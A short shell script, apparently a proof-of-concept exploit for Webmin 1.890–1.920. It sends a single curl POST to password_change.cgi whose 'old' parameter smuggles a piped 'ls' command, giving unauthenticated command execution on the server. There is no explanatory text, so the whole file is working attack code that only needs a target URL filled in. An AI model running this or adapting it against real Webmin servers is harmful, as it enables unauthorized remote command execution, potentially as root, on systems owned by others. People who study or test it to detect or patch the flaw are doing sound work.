#!/bin/sh
# 
# Webmin 1.890 - 1.920
#

TARGET="https://localhost:10000"

curl -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1' \
    -H 'Referer: ${TARGET}/session_login.cgi' \
    -d 'user=root&pam=&expired=2&old=02de3d32dcab7be3%7cls%20&new1=02de3d32dcab7b45&new2=02de3d32dcab7b45' \
    -X POST -k ${TARGET}/password_change.cgi
